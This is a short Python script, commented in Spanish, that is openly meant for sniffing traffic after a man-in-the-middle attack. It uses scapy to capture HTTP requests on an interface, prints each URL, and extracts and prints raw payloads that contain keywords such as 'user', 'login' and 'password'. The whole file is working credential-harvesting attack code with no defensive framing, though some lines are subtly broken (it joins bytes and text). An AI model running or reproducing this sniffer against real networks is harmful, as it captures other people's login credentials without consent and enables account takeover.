#!/usr/bin/env python3
"""SNIFFER
Script que permite snifar el tráfico cuando hemos realizado un MITM
"""

import scapy.all as scapy
# Necesita instalar scapy_http
from scapy.layers import http


def sniff(interface="eth0"):
    scapy.sniff(iface=interface, store=False, prn=porcess_sniffed_packet)
    # , filter=["udp","tcp", "ftp", "arp", "port 80"])


def get_login_info(packet) -> str:
    load = "None"
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["usrname", "user", "login", "password", "pass", "pwd",
                    "format"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def porcess_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[*]\t\tURL\n\t\t\t" + str(url))
        login = get_login_info(packet)
        if login:
            print("[*]\t\t login catched\n\t\t\t" + login)


sniff()
